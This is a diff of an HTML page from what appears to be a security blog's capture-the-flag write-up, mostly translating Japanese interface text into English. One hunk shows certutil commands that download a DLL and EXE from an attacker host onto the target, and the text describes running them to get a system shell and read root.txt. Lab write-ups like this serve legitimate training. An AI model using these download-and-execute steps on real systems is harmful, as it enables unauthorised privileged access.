@@ -162,7 +162,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -465,7 +465,7 @@
             </figure>
 
 <h2 id="文件传输-1"><a href="#文件传输-1" class="headerlink" title="文件传输"></a>文件传输</h2><p>然后就是把生成的新文件传回去：</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -split -f <span class="string">"http://10.10.14.10:7777/WcfRemotingLibrary.dll"</span> WcfRemotingLibrary.dll</span><br><span class="line">certutil -urlcache -split -f <span class="string">"http://10.10.14.10:7777/WcfClient.exe"</span> WcfClient.exe</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> <span class="string">"http://10.10.14.10:7777/WcfRemotingLibrary.dll"</span> WcfRemotingLibrary.dll</span><br><span class="line">certutil <span class="literal">-urlcache</span> <span class="operator">-split</span> <span class="operator">-f</span> <span class="string">"http://10.10.14.10:7777/WcfClient.exe"</span> WcfClient.exe</span><br></pre></td></tr></table></figure>
 
 <h1 id="exploit-amp-amp-root-flag"><a href="#exploit-amp-amp-root-flag" class="headerlink" title="exploit &amp;&amp; root flag"></a>exploit &amp;&amp; root flag</h1><p>然后直接运行传上去的WcfClient.exe，里面的恶意代码会以特权用户执行，得到system shell，读取root.txt(这个打到的shell很容易断，需要快速操作，或者直接在这个shell的基础上再加载一个shell比较稳定):</p>
 <figure class="image-bubble">
@@ -502,7 +502,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2021-05-06T00:46:10.213Z" itemprop="dateUpdated">2021-05-06 08:46:10</time>
+    Last updated: <time datetime="2021-05-06T00:46:10.213Z" itemprop="dateUpdated">2021-05-06 08:46:10</time>
 </span><br>
 
 
@@ -669,7 +669,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
